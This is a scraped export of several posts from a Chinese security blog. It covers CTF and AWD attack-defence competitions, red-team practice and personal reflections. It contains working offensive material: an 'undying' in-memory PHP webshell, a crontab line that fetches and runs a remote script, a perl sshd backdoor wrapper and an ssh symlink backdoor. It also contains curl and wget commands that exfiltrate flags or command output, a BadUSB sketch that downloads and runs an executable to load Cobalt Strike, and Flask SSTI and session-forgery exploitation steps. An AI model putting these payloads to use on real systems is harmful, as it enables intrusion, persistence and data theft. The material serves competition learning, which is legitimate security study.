&#39;whoami&#39;)).read())&quot;,&#123;&#39;_request_ctx_stack&#39;:url_for.__globals__[&#39;_request_ctx_stack&#39;],&#39;app&#39;:url_for.__globals__[&#39;current_app&#39;]&#125;)&#125;&#125; Above figure shows that a webshell was generated in memory and can be visited via route /shell while pass paramater cmd to execute the system command,default command are whoami. EndIn this passage I just show how to use it , but I think the critical problem is analyse the execute logic and try to find some way to fix? or exploit it in a new way:)","categories":[],"tags":[]},{"title":"AWD新手的不死马及权限维持思路","slug":"AWD不死马","date":"2021-05-29T02:42:40.000Z","updated":"2021-05-29T04:08:07.000Z","comments":true,"path":"2021/05/29/AWD不死马/","link":"","permalink":"https://polosec.github.io/2021/05/29/AWD%E4%B8%8D%E6%AD%BB%E9%A9%AC/","excerpt":"","text":"参考链接https://jlkl.github.io/2019/02/08/Web_13/https://rmb122.com/2019/04/04/%E5%B9%B2%E6%8E%89-PHP-%E4%B8%8D%E6%AD%BB%E9%A9%AC/https://www.cnblogs.com/Cl0ud/p/13620537.htmlhttps://zhuanlan.zhihu.com/p/88850561 概念不死马指的是入到内存的webshell，在PHP中可以使用ulink删除自身文件并循环创建webshell。 不死马利用流程首先根据web后门或者任何挖掘出来的漏洞尝试执行系统命令（如遗留的web后门等），通过该类漏洞成功执行写入不死马的系统命令并执行该不死马。比如通过内置的后门直接system(“echo 不死马脚本内容 &gt;/var/www/html;php 不死马文件名.php”)。这样就会在该目录下不断生成一个不死马 比如.3.php。通过webshell管理工具或者使用Python写脚本批量访问去getflag。 不死马这里偷个别的师傅的图先不死马一般长这样 12345678910111213&lt;?php ignore_user_abort(true);&#x2F;&#x2F;设置与客户机断开是否会终止脚本的执行，这里设置为true则忽略与用户的断开，即使与客户机断开脚本仍会执行。 set_time_limit(0); unlink(__FILE__); $file &#x3D; &#39;.3.php&#39;; $code &#x3D; &#39;&lt;?php if(md5($_GET[&quot;pass&quot;])&#x3D;&#x3D;&quot;1a1dc91c907325c69271ddf0c944bc72&quot;)&#123;@eval($_POST[a]);&#125; ?&gt;&#39;; &#x2F;&#x2F;pass&#x3D;pass while (1)&#123; file_put_contents($file,$code); system(&#39;touch -m -d &quot;2018-12-01 09:10:12&quot; .3.php&#39;); usleep(0); &#125;?&gt; 该不死马不断生成.3.php，通过访问http://localhost/.3.php?pass=pass 然后POST a=system(“想要执行的系统命令”);即可通过不死马实现命令执行。这里使用MD5是因为防止别人骑着自己的马进去了，MD5理论上不可逆。如果使用python批量getshell的话大体思路就是 url=http://localhost/.3.php?pass=passdata={“a”:”system(&quot;cat /flag&quot;);”}flag=requests.post(url=url,data=data).text然后url变变就可以，一般会维护一个地址池 从地址池里面取url或者取特征（可能某个url字段不一样）直接打就行，再配合提交flag的api就可以实现自动getflag。 不死马删除这里不死马删除有几个思路1.shell脚本直接删除不死马 12345while :do rm -rf .3.php; echo &quot;remove success&quot;;done 这里其实可以更完善一些，比如挂上while自动检测新增的文件 或者配合文件监控脚本实现新增之后直接调用函数删除新增的文件等等（Python实现，我不会shell）2.PHP服务重启（awd环境可能不允许，因为权限较低）service apache2 restartservice php restart 3.杀低权限PHP进程php-apache: 12&lt;?phpsystem(&quot;kill &#96;ps -ef | grep httpd | grep -v grep | awk &#39;&#123;print $2&#125;&#39;&#96;&quot;); php-fpm: 123&lt;?phpsystem(&quot;kill &#96;ps -ef | grep php-fpm | grep -v grep | awk &#39;&#123;print $2&#125;&#39;&#96;&quot;); awd权限维持AWD的权限维持其实和普通的权限维持差不多常用的大概有 crontab ssh软连接 sshwrapper。详情参考https://xz.aliyun.com/t/7338细看了下这篇文章 发现了一个隐藏一句话的方法。 1echo -e &quot;&lt;?&#x3D;\\&#96;\\$_POST[cmd]\\&#96;?&gt;\\r&lt;?&#x3D;&#39;System default page.&#39;;?&gt;&quot; &gt;default.php crontab添加计划任务自动写不死马 1* * * * * curl http:&#x2F;&#x2F;host&#x2F;sh.sh &gt;&#x2F;tmp&#x2F;.tmp&#x2F;1.sh;chmod u+x &#x2F;tmp&#x2F;.tmp&#x2F;1.sh ; &#x2F;tmp&#x2F;.tmp&#x2F;1.sh 本地起一个http服务 放上一个sh.sh脚本，里面写了创建php不死马的命令。下面两种暂时利用失败 可能是腾讯云的原因。 12345678910111213ssh wrappercd &#x2F;usr&#x2F;sbin&#x2F;mv sshd ..&#x2F;bin&#x2F;echo &#39;#!&#x2F;usr&#x2F;bin&#x2F;perl&#39; &gt;sshdecho &#39;exec &quot;&#x2F;bin&#x2F;sh&quot; if(getpeername(STDIN) &#x3D;~ &#x2F;^..4A&#x2F;);&#39; &gt;&gt;sshdecho &#39;exec&#123;&quot;&#x2F;usr&#x2F;bin&#x2F;sshd&quot;&#125; &quot;&#x2F;usr&#x2F;sbin&#x2F;sshd&quot;,@ARGV,&#39; &gt;&gt;sshdchmod u+x sshd&#x2F;etc&#x2F;init.d&#x2F;sshd restartexp:socat STDIO TCP4:target_ip:22,sourceport&#x3D;13377ssh软连接ln -sf &#x2F;usr&#x2F;sbin&#x2F;sshd &#x2F;tmp&#x2F;su; &#x2F;tmp&#x2F;su -oPort&#x3D;5555;建立一个软连接，然后通过5555端口访问ssh服务 还有一种操作就是curl外带本地命令执行结果,这个也可以写到crontab里面，比较方便的使用提交flag的api提交flag。示例如下 curl “http://:7777?flag=$(cat /flag)” 一些小技巧用来迷惑对手 12alias crontab&#x3D;&quot;echo no crontab for &#96;whoami&#96; ||&quot;alias cat&#x3D;&quot;echo &#96;date&#96;|md5sum|cut -d &#39; &#39; -f1||&quot;","categories":[],"tags":[],"author":"Polo"},{"title":"安网杯部分wp","slug":"安网杯部分wp","date":"2021-05-12T09:57:42.000Z","updated":"2021-05-14T15:54:34.000Z","comments":true,"path":"2021/05/12/安网杯部分wp/","link":"","permalink":"https://polosec.github.io/2021/05/12/%E5%AE%89%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86wp/","excerpt":"","text":"web1webshell上传 前端绕过。绕了半天才想起来是前端绕过。。burp改个后缀就好了 12345678910111213141516171819代码function checkFile() &#123; var file &#x3D; document.getElementsByName(&#39;upload_file&#39;)[0].value; if (file &#x3D;&#x3D; null || file &#x3D;&#x3D; &quot;&quot;) &#123; alert(&quot;请选择要上传的文件!&quot;); return false; &#125; &#x2F;&#x2F;定义允许上传的文件类型 var allow_ext &#x3D; &quot;.jpg|.png|.gif&quot;; &#x2F;&#x2F;提取上传文件的类型 var ext_name &#x3D; file.substring(file.lastIndexOf(&quot;.&quot;)); &#x2F;&#x2F;判断上传文件类型是否允许上传 if (allow_ext.indexOf(ext_name + &quot;|&quot;) &#x3D;&#x3D; -1) &#123; var errMsg &#x3D; &quot;该文件不允许上传，请上传&quot; + allow_ext + &quot;类型的文件,当前文件类型为：&quot; + ext_name; alert(errMsg); return false; &#125;&#125; 拿到shell 蚁剑上传 cat /flag web3http://172.20.2.4:9003/index.php?txt=../../../flag 任意文件读取，秒了 web7知识点：SSTI,SSTI读配置文件，/proc目录的作用，flask session伪造 首先，尝试登录172.20.2.3:9006,登录失败，访问了一下robots.txt,发现了有报错信息，观察URL，考虑可能存在XSS， image-20210511155722690.png这里看了一眼中间件分析结果，发现了flask。。flask人狂喜（。 直接4 image-20210511155809022.png懂得都懂，铁ssti了，尝试一步步rce，检测发现没开debug模式，所以只能走常规的rce利用了。 当尝试到 1&#39;&#39;.__class__.__mro__[-1].__subclasses__() 时发现被ban了，单独测试了下小括号，发现是ban了小括号。既然ban了小括号，那么常规的ssti rce基本就走不通了。只能考虑读取一些敏感文件，比如config，使用payload 读取config文件，发现了 secret_key image-20210511160014837.png secret_key的作用是生成session，具体步骤我忘了，反正是根据secret_key可以还原和生成对应的session。 github有对应的工具，flask session manager。 接下来看了看源码，image-20210511160246157.png 一个简单的前端验证，burp抓返回包把0改成1就行，这样就顺利进入后台了。但是进入后台后提示我不是admin（2333 image-20210511160330889.png 好吧，看起来是要伪造admin的session了。现在secret_key有了，用工具先解密当前session，把用户名改成admin后再生成session。如下图所示 image-20210511160731351.png 那么当前生成的admin的session就是eyJ1c2VybmFtZSI6ImFkbWluIn0.YJo7Og.7WfYqubO5M7KZ-8IXXKIp6kMf5o，edit this cookie 换一下（我这chrome有bug，用的firefox） image-20210511160841881.png 已经给了hint，考虑任意文件读取，首先尝试读取/etc/passwd，成功。 image-20210511161046827.png 接下来尝试读flag。直接/flag不行，关键字给过滤了。卡了好几个小时 用了挺多绕过方法 /fla? /f* 等等 但是可能中间有转义之类的，最终传到Linux层并不能识别通配符，所以卡了很长时间 最后的思路是之前比赛中读flag，过滤了很多，师傅告诉我利用/proc/目录读文件，proc目录代表了与当前运行进程有关的信息并以文件的形式展示（学习链接：https://blog.csdn.net/qq_45521281/article/details/114594402），而/proc/self目录代表了当前进程的有关信息并以文件的形式展示，需要注意的有fd、cmdline、cwd、envrion等。 /proc/self/cmdline 代表当前的命令行输入内容，我读取了之后是这个 image-20210511161330178.png 好家伙 绝对路径有了，直接读文件 /app/app_a384gh1.py 程序代码如下，基本修复了ssti-&gt;rce，然后看到了import ffffffff111llllag 文件，那直接读当前/app目录下的ffffffff111llllag.py就好了。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384from flask import Flask,request,render_template_string,redirect,render_template,sessionimport randomimport stringimport base64import ffffffff111llllagapp = Flask(import_name=__name__,template_folder=&#x27;templates&#x27;,static_folder=&#x27;static&#x27;,static_url_path=&#x27;/static&#x27;)app.config[&#x27;SECRET_KEY&#x27;] =&#x27;&#x27;.join(random.sample(string.ascii_letters + string.digits, 8))@app.before_requestdef before_request(): if &#x27;/admin/&#x27; in request.path: sess_name=&#x27;guest&#x27; print(session) if &#x27;username&#x27; in session: sess_name=session[&#x27;username&#x27;] if sess_name!=&#x27;admin&#x27;: return &#x27;Your current account is &#x27;+sess_name+&#x27; not admin&#x27;@app.after_requestdef makeheader(response): response.headers[&quot;X-Powered-By&quot;] = &quot;PHP/7.2.10&quot; response.headers[&quot;Hint&quot;] = &quot;Wake up Neo, the Matrix has you&quot; response.headers[&#x27;Server&#x27;]=&#x27;Apache/2.4.35 (Win64) PHP/7.2.10&#x27; return response@app.route(&#x27;/&#x27;)def redirect_2_index(): if &#x27;username&#x27; not in session: print(&#x27;not in session!&#x27;) session[&#x27;username&#x27;]=&#x27;guest&#x27; return redirect(&quot;./index.php&quot;, code=302)@app.route(&quot;/err.php&quot;)def err(): #I patched the SSTI vulnerability.How clever I am! errorinfo=request.args.get(&quot;errorinfo&quot;) blacklist=[&quot;(&quot;,&quot;)&quot;] for black in blacklist: if black in errorinfo: return &quot;You&#x27;re just a dirty hacker,aren&#x27;t you?&quot; return render_template_string(&quot;Oh no,there is an Error! Error info:&lt;p&gt; %s&quot; % errorinfo)@app.route(&quot;/index.php&quot;)def index(): return render_template(&quot;index.html&quot;)@app.route(&quot;/login.php&quot;,methods=[&#x27;POST&#x27;])def login(): username=request.form[&#x27;username&#x27;] password=request.form[&#x27;password&#x27;] if &quot;&#x27;&quot; in username or &quot;&#x27;&quot; in password: return &quot;You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &#x27;&#x27;&#x27;&quot; return &#x27;0&#x27;@app.route(&quot;/admin/backendmanage.php&quot;)def backendmanage(): img=request.args.get(&quot;img&quot;) if not img: img=&#x27;1.png&#x27; if &quot;flag&quot; in img: return &quot;You&#x27;re just a dirty hacker,aren&#x27;t you?&quot; content = &#x27;&#x27; with open(img, &#x27;rb&#x27;) as img_f: content = img_f.read() content = base64.b64encode(content) content=&#x27;&#x27;.join([chr(i) for i in content]) return &#x27;&lt;h1&gt;Current Image:&#123;img&#125;&lt;/h1&gt;&lt;!-- ?img=1.png --&gt;&lt;img src=&quot;data:;base64,&#123;content&#125;&quot;&gt;&#x27;.format(img=img,content=content)@app.errorhandler(Exception)def all_exception_handler(e): e=str(e) return redirect(&quot;/err.php?errorinfo=&quot;+e, code=302)if __name__ == &#x27;__main__&#x27;: app.run(host=&quot;0.0.0.0&quot;,port=80) 读取flag文件后，拿到flag。 image-20210511161628308.png 这题有几个坑点，首先是HTTP头里面的PHP HEADER 容易迷惑人，其次是登录那的sql注入容易迷惑人，最后是FLASK-SSTI的利用方式需要掌握全面： 1.直接RCE 2.开DEBUG时，SSTI 读文件-&gt;构造PIN码-&gt;RCE 3.伪造session登录 misc1流量包没看出来啥，直接分离http对象发现了flag.php，压缩包被破坏了，修复下头 12345678910111213141516171819202122232425262728293031JPEG (jpg)， 文件头：FFD8FF 文件尾：FF D9 PNG (png)， 文件头：89504E47 文件尾：AE 42 60 82GIF (gif)， 文件头：47494638 文件尾：00 3B ZIP Archive (zip)， 文件头：504B0304 文件尾：50 4BTIFF (tif)， 文件头：49492A00 文件尾：Windows Bitmap (bmp)， 文件头：424D 文件尾：CAD (dwg)， 文件头：41433130 文件尾：Adobe Photoshop (psd)， 文件头：38425053 文件尾：Rich Text Format (rtf)， 文件头：7B5C727466 文件尾：XML (xml)， 文件头：3C3F786D6C 文件尾：HTML (html)， 文件头：68746D6C3EEmail [thorough only] (eml)， 文件头：44656C69766572792D646174653AOutlook Express (dbx)， 文件头：CFAD12FEC5FD746FOutlook (pst)， 文件头：2142444EMS Word&#x2F;Excel (xls.or.doc)， 文件头：D0CF11E0MS Access (mdb)， 文件头：5374616E64617264204AWordPerfect (wpd)， 文件头：FF575043Adobe Acrobat (pdf)， 文件头：255044462D312EQuicken (qdf)， 文件头：AC9EBD8FWindows Password (pwl)， 文件头：E3828596RAR Archive (rar)， 文件头：52617221Wave (wav)， 文件头：57415645AVI (avi)， 文件头：41564920Real Audio (ram)， 文件头：2E7261FDReal Media (rm)， 文件头：2E524D46MPEG (mpg)， 文件头：000001BAMPEG (mpg)， 文件头：000001B3Quicktime (mov)， 文件头：6D6F6F76Windows Media (asf)， 文件头：3026B2758E66CF11MIDI (mid)， 文件头：4D546864 image-20210512132636816.png 提取rar image-20210512132807911.png 十六进制转ascii flag{My_Name_is_AoBai} misc2zip文件头修复 得到密文5a6e4665536e506248206579666b7b39733930733833742d393637312d3433626a2d616f69302d3235663176393138707030377d 十六进制转ascii ZnFeSnPbHeyfk{9s90s83t-9671-43bj-aoi0-25f1v918pp07} 维吉尼亚解密（captfencoder1.x版本 维吉尼亚解密有bug） flag{9a90f83e-9671-43ac-bbd0-25b1d918ca07} misc 3压缩包头部修复，修改错了的1位 然后需要密码，直接binwalk分离出来一个Linux可执行文件，到这里卡住了。。然后后面看了看文件头应该是个png，zhiweilai加上png的为文件头后发现图片宽高有问题，Linux打不开，用脚本爆破宽高修改即可。 脚本如下 123456789101112131415161718192021222324252627282930import zlibimport structimport sysimport binasciifilename = sys.argv[1]with open(filename, &#x27;rb&#x27;) as f: all_b = f.read() crc32key = int(all_b[29:33].hex(),16) data = bytearray(all_b[12:29]) n = 4095 #理论上0xffffffff,但考虑到屏幕实际/cpu，0x0fff就差不多了 for w in range(n): #高和宽一起爆破 width = bytearray(struct.pack(&#x27;&gt;i&#x27;, w)) #q为8字节，i为4字节，h为2字节 for h in range(n): height = bytearray(struct.pack(&#x27;&gt;i&#x27;, h)) for x in range(4): data[x+4] = width[x] data[x+8] = height[x] crc32result = zlib.crc32(data) if crc32result == crc32key: print(&quot;宽为：&quot;,end=&quot;&quot;) width1=binascii.b2a_hex(width) width1=width1.decode(&#x27;utf-8&#x27;) width1=int(width1,16) print(width,width1) print(&quot;高为：&quot;,end=&quot;&quot;) height1=binascii.b2a_hex(height) height1=height1.decode(&#x27;utf-8&#x27;) height1=int(height1,16) print(height,height1) exit(0) 在对应的位置修改图片宽高的十六进制值即可。 image-20210512175308222.png","categories":[],"tags":[],"author":"Polo"},{"title":"实习&季度总结","slug":"实习-季度总结","date":"2021-04-23T07:17:00.000Z","updated":"2021-04-30T03:43:43.000Z","comments":true,"path":"2021/04/23/实习-季度总结/","link":"","permalink":"https://polosec.github.io/2021/04/23/%E5%AE%9E%E4%B9%A0-%E5%AD%A3%E5%BA%A6%E6%80%BB%E7%BB%93/","excerpt":"","text":"今天是2021年4月29日，刚结束某市hw项目，做完这个项目，我的实习生活基本算是结束了。还在高铁上，趁着这个时间总结下这四个月的实习&amp;项目生活。 金山云实习今年一月份，开始了在金山云实习的日子，总计约三个月，其实干活的时间也就四十来天，中间算上过年、请假什么的，所以日子就比较少了。和同事们的相处很愉快，领导是搞技术的，相处起来非常舒服。在金山的这段时间还算是比较快乐的，虽然累了一点，但是收获相对还不错。在金山，首先是在做项目的过程中学到了一些知识，渗透的思路、测试方法啥的，我觉得这些比较重要，其次是在公司钓鱼的项目中学到了红队知识，并且开启了我对红队向往的大门。在公司，我学到了一些简单的免杀技巧，并且还会继续钻研；接触到了钓鱼邮件伪造，目前还在学习；Badusb上线CS马，这个已经实现了。还有就是基本的应急响应技能，在公司我独立处理了一起应急响应事件，我觉得真的是很棒的实践机会。最后是社交方面，认识了一些朋友。其他虚无缥缈的不说了，只说些实际的。 hw蓝队今年hw去了青藤，本来签了深蓝，深蓝的负责人对我也很好，但是后面出了点事情，所以我就给鸽了…不管怎么说，感谢硕哥给我机会，弟弟铭记在心。说实在的，hw我是夜班，主要是看HIDS设备告警，被地方的给搞烦了，经常有误报，白天的同时也很辛苦，我觉得我夜班还是非常幸运的，就是身体上累了点。我觉得 通过这次hw 认识朋友比较重要吧，其次就是真真正正地接触了一下这种大型的安全项目，之前并没有接触过。还有就是在hw时的一些处理事情的方法，比如处置流程、权限与职责。之类的之前也只是限于理论，也更加了解了我想象中的hw和真实的hw的区别2333. hw红队最后打了一次县市级的hw红队，其实还是挺丢人的，我自己知道自己水平不行，但是还是想去试试。虽然朋友跟我讲了是无责的，但是打了那么烂的成绩，自己心里真的不好受。。相比于拿到工资，更多的是自责吧。当然了，在这次的红队之旅中也学到了一些东西。首先是自己的渗透思路问题，渗透思路首先是不清晰，其次是太窄。信息收集时经常有遗漏或者对这个站做了某方法的收集，到了下个站就忘了或者不想做了。。这个毛病不知道什么时候能改掉。其次是漏洞的原理掌握的不够好和漏洞类型掌握的不够多，绕waf等操作需要较强的基础性知识。就像ssti绕过一样~不管怎么说，红队来了这一趟我个人是不亏的，但是对不起朋友了。 后话希望下次看到这篇博客，能对比写时有些进步。","categories":[],"tags":[],"author":"Polo"},{"title":"命令执行结果外带","slug":"命令执行结果外带","date":"2021-04-17T18:25:55.000Z","updated":"2021-04-17T21:37:56.000Z","comments":true,"path":"2021/04/18/命令执行结果外带/","link":"","permalink":"https://polosec.github.io/2021/04/18/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%93%E6%9E%9C%E5%A4%96%E5%B8%A6/","excerpt":"","text":"wget –header=”test:$(whoami)” http://ssti.com:5000\\?username\\=1 whoami | curl -F “:data=@-“ http://ssti.com:5000\\?username\\=1 Curl “http://ssti.com:5000?username=&#96;whoami&#96;&quot;","categories":[],"tags":[]},{"title":"badusb踩坑&近期感想","slug":"badusb踩坑-近期感想","date":"2021-03-29T12:34:48.000Z","updated":"2022-01-12T09:25:38.000Z","comments":true,"path":"2021/03/29/badusb踩坑-近期感想/","link":"","permalink":"https://polosec.github.io/2021/03/29/badusb%E8%B8%A9%E5%9D%91-%E8%BF%91%E6%9C%9F%E6%84%9F%E6%83%B3/","excerpt":"","text":"前言： 近期在公司内部学了一点红队技能，虽然目前用不上，但是做个记录，顺便发牢骚。 致谢&amp;参考https://www.freebuf.com/articles/system/261020.html https://blog.csdn.net/sxhexin/article/details/87914649 https://www.anquanke.com/post/id/227477 https://www.freebuf.com/articles/system/261020.html Badusb 插入上线cobalt strike准备工作ATtiny85 开发板、arduino IDE下载https://www.arduino.cc/en/Main/Softwaredigispark。暂时先不要装驱动！！驱动有大坑。 看freeebuf里面的教程装完驱动，烧录完只能执行一次，需要更新下固件才可以重复使用，后面会提到。 环境配置打开IDE,在文件-&gt;首选项中加入附加开发板管理，附加开发板管理网址处写 1http:&#x2F;&#x2F;digistump.com&#x2F;package_digistump_index.json 注意，这里需要翻墙，后面添加开发板下载相关配置时也需要翻墙，现在就翻着 别断了。 添加开发板IDE中-工具-开发板管理，类型-contributed/贡献，选择 然后选安装（翻墙) 安装好后，选择这个16.5mhz的开发板。 更新 boot loader更新 BootLoader的教程看 https://blog.csdn.net/sxhexin/article/details/87914649，这里不再赘述，跟着这个教程走没问题的，如果你之前有装相关驱动，请把驱动卸载干净！！！ 更新BootLoader是因为避免踩烧录完只能运行一次的坑！！ BootLoader是大坑，一定要好好弄！ 编写代码有兴趣一步步走的可以写个测试代码 cmd弹个窗什么的，我这里一步到位，直接远程加载exe。 对于cs 可以生成powershell，然后cmd里面powershell加载调用直接上线。 使用CMD远程下载可执行文件我选择用cmd的原因是因为 我还不会powershell免杀（2333） 所以 探索了下 如何类似Linux执行多条命令，发现在Windows cmd下是and符号&amp;。 执行命令的代码框架如下： 123456789101112#include &quot;DigiKeyboard.h&quot;//库文件void setup() &#123;// setup函数只运行一次DigiKeyboard.delay(2000);//等待两秒，给电脑自动加载配置时间DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);//摁住WIN键DigiKeyboard.delay(300);//等待300毫秒DigiKeyboard.println(&quot;cmd&quot;);//输入CMDDigiKeyboard.delay(300);DigiKeyboard.println(&quot;curl http://12xxxx0/calc.exe &gt; E:\\\\calc.exe &amp; E:\\\\calc.exe&quot;);//执行PAYLOAD，双引号需要斜杠转义&#125;void loop() &#123;&#125; 注意，在最后一个注释处，是在前面语句打开cmd黑框的情况下，在cmd中输入的语句。两个反斜杠是为了转义。 我的思路是，将可执行exe文件上传至服务器，通过curl的方式下载并重定向至某个驱动器并执行。 我本来想放到C盘，但是放到C盘，有可能存在权限问题（放在C:\\Windows\\Temp）目录下也有些问题，于是放到了D/E盘。 将上述代码在IDE中输入后ctrl+u上传，然后插入attiny85 一定是先拔出来，出现这个 60seconds的时候插进去，出现下面这一串代表写入成功 并且会自动执行一次。 然后拔出来 再插进去的时候 就有弹计算器的效果了。（小思考，如何在执行完exe后自动关闭cmd黑框？） 效果如下： CMD上线CS嫖来了大佬的免杀方法，试一下exe上线cs 小思考的答案是：命令后跟&amp; exit; 杂谈5pyA6L+R5LiN5pivaHfkuYjvvIzorqTor4bkuIDkuKrlhazlj7jnmoRocuWnkOWnkO+8jOacgOi/keS5n+WcqGh35oub5Lq677yM6ZyA6KaB5LiA5Lqb5pyJ5omL5bCx6KGM55qE5bKX5L2N77yM5a+55rKh5Y67aHfov4cg5bm25LiU5oqA5pyv5LiN5oCO5LmI5qC355qE5ZCM5a2m5p2l6K+077yMNDAw5LiA5aSp55qE5b6F6YGH44CB5YyF5ZCD5L2P44CB5LiN6ZyA6KaB6Ieq5bex5Z6r6ZKx44CB6aG555uu546w5Zy65pyJ5Lq65bim77yM5oiR6KeJ5b6X5bey57uP5b6I5aW95ZWm44CC5aaC5p6c5oiR5aSn5LqM55qE5pe25YCZ5pyJ6L+Z56eN5py65Lya77yM5ZOq5oCV5LiN57uZ5oiR5bel6LWE77yM5oiR5Lmf6KaB5Y6744CC5oiR5L2c5Li65LiA5Liq5a2m55Sf77yM6Zmk5LqG5aSW5Ye66Ieq5bex5o6l6aG555uu77yM5a6e5Zyo5piv5oOz5LiN5Yiw6L+Y5pyJ5LuA5LmI5q+UaHfmm7Tlpb3nmoTog73nm7jlr7nku47nroDljZXlvIDlp4vmjqXop6blronlhajlrp7miJjnmoTlnLrmma/kuobjgILvvIhTUkPkuI3nrpfvvIxTUkPkuZ/pnIDopoHnm7jlvZPnmoTlronlhajln7rnoYDjgILvvInmiJHmiorov5nkuKrmtLvmjqjov4fljrvkuYvlkI7vvIzkuInkuKrluIjlvJ/kuZ/lvojnu5nlipvvvIzpgJrov4fkuobpnaLor5XjgILlj6/kuIfkuIfmsqHmg7PliLDor7flgYfnmoTml7blgJnlh7rpl67popjkuobvvIzlr7zlkZjor7TnjrDlnKjnmoTph43lv4PlupTor6XmmK/kuJPkuJror77lrabkuaDjgIHogIzkuI3mmK/mg7PnnYDlh7rljrvlrp7kuaDvvIzlubbkuJTmi7/miJHkuL7kvovlrZAyMzMz44CC5pyA5ZCO6L+Y6K+077yM5Y+q6KaB5L2g5Y675LqG5bCx57uZ5L2g6YCA5a2m77yM55yf5LiN5oiz44CC54S26ICM5pu05Y+v56yR55qE5piv77yM5p+Q6ICB5biI5ZyoMTfnuqfpgJrnn6XnvqTlj5Hkuoblj6bkuIDlrrbmnLrmnoTnmoRod+Wuo+S8oO+8jOW+hemBh+aIkeS5n+ivtOS4i++8jDMwMC00MDDkuIDlpKnvvIzkuI3ljIXlkIPkvY/vvIzmnInlhY3otLnln7norq3vvIzmoLnmja7ln7norq3ogIPmoLjnu5PmnpzliIbnuqLok53pmJ/vvIjvvJ/vvInvvIznhLblkI7miJHmiZPnlLXor53ov4fljrvpl67kuobkuIvvvIzmu6HlmLTot5/miJHosIjnkIbmg7PosIjpgZPlvrfosIjmioDmnK/jgIHlsLHor7TlrabnlJ/kuI3opoHogIHmg7PnnYDmjKPpkrHkupHkupHjgILmiJHkvLDorqEg5LiN57uZ5oiR6L+Z5LiJ5Liq5biI5byf5YGH55qE5Y6f5Zug77yM5bqU6K+l5piv5Yqo5LqG5LuW5Lus55qE6JuL57OV5LqG5ZCn77yM5LuO6YKj6L656LWw6IO95oq96ZKxMjMzM+OAguWtpumZouWvueaIkeW+iOWlveOAgeWQhOS9jemihuWvvOiAgeW4iOWSjOiUvOWPr+S6su+8jOWtpumZouS5n+e7meS6huaIkeaOqOWFjeWQjemine+8jOmhuuWIqeaOqOWFjeiHs1VFU1RD44CC5b+D5oCA5oSf5oGp5LmL5b+D77yM5oOz5o6o5biI5byf5LiA5oqK77yM5Y67aHfvvIzmsqHmg7PliLDnq5/nhLbkuI3nu5nlh4blgYfvvIznnJ/nmoTvvIzlv4Pph4zpnaLlh4nkuoblvojlpJrjgILkuI3or7TkuoZ+57un57ut5YaZ5q+V5Lia6K665paH5LqGfg==","categories":[],"tags":[]},{"title":"近一年学习总结","slug":"近一年学习总结","date":"2021-03-06T08:56:06.000Z","updated":"2021-03-06T09:10:50.000Z","comments":true,"path":"2021/03/06/近一年学习总结/","link":"","permalink":"https://polosec.github.io/2021/03/06/%E8%BF%91%E4%B8%80%E5%B9%B4%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/","excerpt":"","text":"虽然接触安全从初中就算开始了，但当时也仅仅是停留于混混娱乐圈，日一日别人的webshell。 大一大二对安全知识的学习较少，大二外出打了两次比赛，成绩较差，直接白给。 大三寒假疫情在家的时候算是正式开始学习安全知识，做最简单的靶场，刷题，前两次正经打的比赛是I春秋高校抗疫和BJDCTF。 这是一个纠结的过程，因为在那个阶段我还要准备保研，还在保研和考研两者之间摇摆。 最终下定决心冲一冲，那是三月底。某公众号预测我保研成功率在30%左右。 具体学什么知识在这里也不想说了，算是从最基础的开始学习吧，印象比较深的是LFI。现在我XSS和注入玩的也不好，算是只会用工具跑跑。 保完研之后有些许松懈，对安全知识的学习有些懈怠了，SRC还没开始搞，到现在上班时间也不太充裕。 现在正好是三月初，距离我开始正式接触安全也差不多一年的时间，在这一年里，我做到了： 1.两份渗透岗实习经历 2.两次通过护网面试，一次中级，一次初级。（蓝队 3.拿到五所985网络安全专业OFFER,其中四个学硕; 4.数次参加线上赛，虽然白给的较多 5.两次带队参加省赛 6.开始打AWD 7.独立发表一篇论文 8.独立完成两个小项目 9.美赛建模一等奖 10.自费MacBook Pro 11.经济独立 12.顺利保研 下一年渴望更健康的身体与相对坚强的意志，至少不能中午一觉睡三个小时。 仅此记录","categories":[],"tags":[]},{"title":"记一次线上AWD","slug":"记一次线上AWD","date":"2021-02-24T16:24:25.000Z","updated":"2021-02-24T16:52:22.000Z","comments":true,"path":"2021/02/25/记一次线上AWD/","link":"","permalink":"https://polosec.github.io/2021/02/25/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%BA%BF%E4%B8%8AAWD/","excerpt":"","text":"最近打了一次线上AWD，算是第一次正式打AWD,表现不太好，前期看了一些AWD的思路和套路，但是没有真正应用于实际的AWD环境中，随做一次记录，记录这里面存在的问题以及没做好的地方。 开赛开局给了ssh和web服务以及要求，如果被check down了，每轮扣100分（当时不知道每轮扣100分，以为一共扣100，每次restart需要扣100并且重置环境，所以就一直没restart） 防护拿到ssh权限后首先备份了文件，用D盾、河马webshell专杀工具对web环境进行杀毒，想查杀webshell。 在webshell查杀环节中，使用河马webshell专杀工具和D盾杀了一个shell，但是有免杀shell没杀出来（一般AWD会内置多个后门），由于时间原因也没有细看，造成的后果是被传了不死马。（这是后话了。 在webshell查杀环节中应改进的地方是： 1.采用多种工具综合查杀webshell 2.对疑似后门文件手工查看，不能完全相信工具。 弱点1流量监控脚本没挂上去，导致监控流量失败，无法得知有哪些payload是发起了攻击。 自检通过观察web服务以及报错页面，出现了经典的十年磨一剑—-TP5.0.2，于是立刻想到了TP5.0.2的RCE。 网上收集payload后打了一波cat/flag，成功，并且通过该方式拿到了其他队伍的flag，遂考虑采用脚本编写EXP批量getflag并通知负责防护的队员修复相关漏洞。 弱点2在修复时浪费了太多的时间，负责修复的队员无法尽快修复，并在上传修复后的文件时遇到了权限问题。 弱点3临场紧张+payload不熟悉 我真的吐了。当时太紧张了，之前利用TP5的payload也是复制粘贴，这两个因素加起来导致我在Hackbar能顺利打payload，Burp也可以，但到了写脚本的时候就不行。因为payload是四个键值对，我写脚本的时候只写了一个。 贴一下我当时写的脚本 123456789#!/usr/bin/env pythonimport requests,jsonurl=&quot;http://47.104.144.188:&quot;rest=&quot;/index.php?s=captcha&quot;data=&#123;&#x27; 